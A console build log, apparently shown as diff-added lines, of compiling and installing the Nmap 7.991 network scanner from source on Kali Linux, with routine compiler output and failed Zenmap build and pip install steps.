+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   scan_engine_connect.cc -o scan_engine_connect.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   scan_engine_raw.cc -o scan_engine_raw.o
+  CC       src/libpcre2_8_la-pcre2_chartables.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   scan_lists.cc -o scan_lists.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   service_scan.cc -o service_scan.o
+  CC       src/libpcre2_posix_la-pcre2posix.lo
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   services.cc -o services.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   string_pool.cc -o string_pool.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   NewTargets.cc -o NewTargets.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   TargetGroup.cc -o TargetGroup.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   Target.cc -o Target.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   targets.cc -o targets.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   tcpip.cc -o tcpip.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   timing.cc -o timing.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   traceroute.cc -o traceroute.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   utils.cc -o utils.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   xml.cc -o xml.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_main.cc -o nse_main.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_utility.cc -o nse_utility.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_nsock.cc -o nse_nsock.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_db.cc -o nse_db.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_dnet.cc -o nse_dnet.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_fs.cc -o nse_fs.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_nmaplib.cc -o nse_nmaplib.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_debug.cc -o nse_debug.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_lpeg.cc -o nse_lpeg.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   nse_zlib.cc -o nse_zlib.o
+g++ -c -I./liblinear -I./liblua -I./libdnet-stripped/include -I./libpcre/src  -I./libpcap -I./nbase -I./nsock/include -DHAVE_CONFIG_H -DNMAP_PLATFORM=\"x86_64-unknown-linux-gnu\" -DNMAPDATADIR=\"/home/kali/Downloads/nmap7-r/share/nmap\" -D_FORTIFY_SOURCE=2 -g -O2 -Wall -fno-strict-aliasing   main.cc -o main.o
+/usr/bin/python3 -m build zenmap/
+/usr/bin/python3: No module named build.__main__; 'build' is a package and cannot be directly executed
+make: *** [Makefile:355: build-zenmap] Error 1
+make: *** Waiting for unfinished jobs....
+  CCLD     libpcre2-8.la
+  CCLD     libpcre2-posix.la
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+Compiling libnetutil
+cd libnetutil && make
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+Compiling liblinear
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblinear'
+make[1]: 'liblinear.a' is up to date.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblinear'
+Compiling libpcap
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcap'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcap'
+Compiling libpcre
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make  all-am
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+Compiling libnbase
+cd nbase && make
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nbase'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nbase'
+Compiling libnsock
+cd nsock/src && make
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+gcc -MM -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include error.c filespace.c gh_heap.c nsock_connect.c nsock_core.c nsock_iod.c nsock_read.c nsock_timers.c nsock_write.c nsock_ssl.c nsock_event.c nsock_pool.c netutils.c nsock_pcap.c nsock_engines.c engine_select.c engine_epoll.c engine_kqueue.c engine_poll.c nsock_proxy.c nsock_log.c proxy_http.c proxy_socks4.c > makefile.dep
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   error.c -o error.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   filespace.c -o filespace.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   gh_heap.c -o gh_heap.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_connect.c -o nsock_connect.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_core.c -o nsock_core.o
+nsock_core.c: In function ‘handle_write_result’:
+nsock_core.c:529:16: warning: unused variable ‘iod’ [-Wunused-variable]
+  529 |   struct niod *iod = nse->iod;
+      |                ^~~
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_iod.c -o nsock_iod.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_read.c -o nsock_read.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_timers.c -o nsock_timers.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_write.c -o nsock_write.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_ssl.c -o nsock_ssl.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_event.c -o nsock_event.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_pool.c -o nsock_pool.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   netutils.c -o netutils.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_pcap.c -o nsock_pcap.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_engines.c -o nsock_engines.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   engine_select.c -o engine_select.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   engine_epoll.c -o engine_epoll.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   engine_kqueue.c -o engine_kqueue.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   engine_poll.c -o engine_poll.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_proxy.c -o nsock_proxy.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   nsock_log.c -o nsock_log.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   proxy_http.c -o proxy_http.o
+gcc -c -I/home/kali/Downloads/nmap-7.991/libpcap  -I/home/kali/Downloads/nmap-7.991/nbase -DHAVE_CONFIG_H -DNSOCK_VERSION=\"0.02\" -D_FORTIFY_SOURCE=2 -I../include -g -O2 -Wall   proxy_socks4.c -o proxy_socks4.o
+rm -f libnsock.a
+ar cr libnsock.a error.o filespace.o gh_heap.o nsock_connect.o nsock_core.o nsock_iod.o nsock_read.o nsock_timers.o nsock_write.o nsock_ssl.o nsock_event.o nsock_pool.o netutils.o nsock_pcap.o nsock_engines.o engine_select.o engine_epoll.o engine_kqueue.o engine_poll.o nsock_proxy.o nsock_log.o proxy_http.o proxy_socks4.o
+ranlib libnsock.a
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+Compiling libdnet
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+Making all in include
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make  all-recursive
+make[3]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+Making all in dnet
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make[4]: Nothing to be done for 'all'.
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[3]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+Making all in src
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Nothing to be done for 'all'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[2]: Nothing to be done for 'all-am'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+Compiling liblua
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblua'
+make[1]: 'liblua.a' is up to date.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblua'
+Compiling nmap
+rm -f nmap
+g++ -Wl,-E  -L./nbase -L./nsock/src/   -o nmap charpool.o FingerPrintResults.o FPEngine.o FPModel.o idle_scan.o MACLookup.o nmap_dns.o nmap_error.o nmap.o nmap_ftp.o NmapOps.o NmapOutputTable.o nmap_tty.o osscan2.o osscan.o output.o payload.o portlist.o portreasons.o protocols.o scan_engine.o scan_engine_connect.o scan_engine_raw.o scan_lists.o service_scan.o services.o string_pool.o NewTargets.o TargetGroup.o Target.o targets.o tcpip.o timing.o traceroute.o utils.o xml.o nse_main.o nse_utility.o nse_nsock.o nse_db.o nse_dnet.o nse_fs.o nse_nmaplib.o nse_debug.o nse_lpeg.o nse_zlib.o main.o ./libnetutil/libnetutil.a -lnsock -lnbase ./libpcre/.libs/libpcre2-8.a \./libpcap/libpcap.a   -lz ./libdnet-stripped/src/.libs/libdnet.a ./liblua/liblua.a ./liblinear/liblinear.a 
+mkdir -p /home/kali/Downloads/nmap7-r/bin /home/kali/Downloads/nmap7-r/share/man/man1 /home/kali/Downloads/nmap7-r/share/nmap
+/usr/bin/install -c -c -m 755 nmap /home/kali/Downloads/nmap7-r/bin/nmap
+/usr/bin/strip -x /home/kali/Downloads/nmap7-r/bin/nmap
+/usr/bin/install -c -c -m 644 docs/nmap.1 /home/kali/Downloads/nmap7-r/share/man/man1/
+if [ "yes" = "yes" ]; then \
+  for ll in de es fr hr hu it ja pl pt_BR pt_PT ro ru sk zh; do \
+    mkdir -p /home/kali/Downloads/nmap7-r/share/man/$ll/man1; \
+    /usr/bin/install -c -c -m 644 docs/man-xlate/nmap-$ll.1 /home/kali/Downloads/nmap7-r/share/man/$ll/man1/nmap.1; \
+  done; \
+fi
+/usr/bin/install -c -c -m 644 docs/nmap.xsl /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 docs/nmap.dtd /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-services /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-rpc /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-os-db /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-service-probes /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-protocols /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-mac-prefixes /home/kali/Downloads/nmap7-r/share/nmap/
+mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/scripts
+mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/nselib
+(cd /home/kali/Downloads/nmap7-r/share/nmap/scripts && rm -f anonFTP.nse ASN.nse asn-to-prefix.nse brutePOP3.nse bruteTelnet.nse chargenTest.nse daytimeTest.nse dns-safe-recursion-port.nse dns-safe-recursion-txid.nse dns-test-open-recursion.nse domino-enum-passwords.nse echoTest.nse ftpbounce.nse HTTPAuth.nse HTTP_open_proxy.nse HTTPpasswd.nse HTTPtrace.nse iax2Detect.nse ircServerInfo.nse ircZombieTest.nse mac-geolocation.nse MSSQLm.nse MySQLinfo.nse netbios-smb-os-discovery.nse nfs-acls.nse nfs-dirlist.nse popcapa.nse PPTPversion.nse promiscuous.nse RealVNC_auth_bypass.nse ripeQuery.nse robots.nse showHTMLTitle.nse showHTTPVersion.nse showOwner.nse showSMTPVersion.nse showSSHVersion.nse skype_v2-version.nse smb-enumdomains.nse smb-enumsessions.nse smb-enumshares.nse smb-enumusers.nse smb-serverstats.nse smb-systeminfo.nse SMTPcommands.nse SMTP_openrelay_test.nse smtp-check-vulns.nse SNMPcommunitybrute.nse SNMPsysdescr.nse SQLInject.nse SSH-hostkey.nse SSHv1-support.nse SSLv2-support.nse strangeSMTPport.nse UPnP-info.nse xamppDefaultPass.nse zoneTrans.nse db2-info.nse db2-brute.nse html-title.nse robots.txt.nse xmpp.nse sql-injection.nse http-robtex-reverse-ip.nse http-vuln-zimbra-lfi.nse http-vuln-0-day-lfi-zimbra.nse whois.nse db2-discover.nse http-crossdomainxml.nse http-email-harvest.nse http-wordpress-plugins.nse http-wp-plugins.nse smb-check-vulns.nse)
+/usr/bin/install -c -c -m 644 nse_main.lua /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 scripts/script.db scripts/*.nse /home/kali/Downloads/nmap7-r/share/nmap/scripts
+/usr/bin/install -c -c -m 644 nselib/*.lua nselib/*.luadoc /home/kali/Downloads/nmap7-r/share/nmap/nselib
+mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/nselib/data
+for f in `find nselib/data -name .svn -prune -o -type d -print`; do \
+        mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/$f; \
+done
+for f in `find nselib/data -name .svn -prune -o -type f -print`; do \
+        /usr/bin/install -c -c -m 644 $f /home/kali/Downloads/nmap7-r/share/nmap/$f; \
+done
+mkdir -p /home/kali/Downloads/nmap7-r/bin /home/kali/Downloads/nmap7-r/share/man/man1 /home/kali/Downloads/nmap7-r/share/applications
+/usr/bin/python3 -m pip install zenmap/ 
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+    
+    If you wish to install a non-Kali-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have pypy3-venv installed.
+    
+    If you wish to install a non-Kali-packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+    
+    For more information, refer to the following:
+    * https://www.kali.org/docs/general-use/python3-external-packages/
+    * /usr/share/doc/python3.13/README.venv
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
+hint: See PEP 668 for the detailed specification.
+make: *** [Makefile:359: install-zenmap] Error 1
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/nmap-7.991]
+└─$ make -j"$(nproc)"
+Compiling libnetutil
+cd libnetutil && make
+Compiling liblinear
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblinear'
+Compiling libpcap
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+make[1]: 'liblinear.a' is up to date.
+Compiling libpcre
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblinear'
+Compiling libnbase
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcap'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcap'
+cd nbase && make
+Compiling libdnet
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nbase'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nbase'
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+Compiling liblua
+/usr/bin/python3 -m build zenmap/
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make  all-am
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblua'
+make[1]: 'liblua.a' is up to date.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblua'
+/usr/bin/python3 -m build ndiff/
+Making all in include
+Compiling libnsock
+cd nsock/src && make
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+cd ncat && make
+make  all-recursive
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
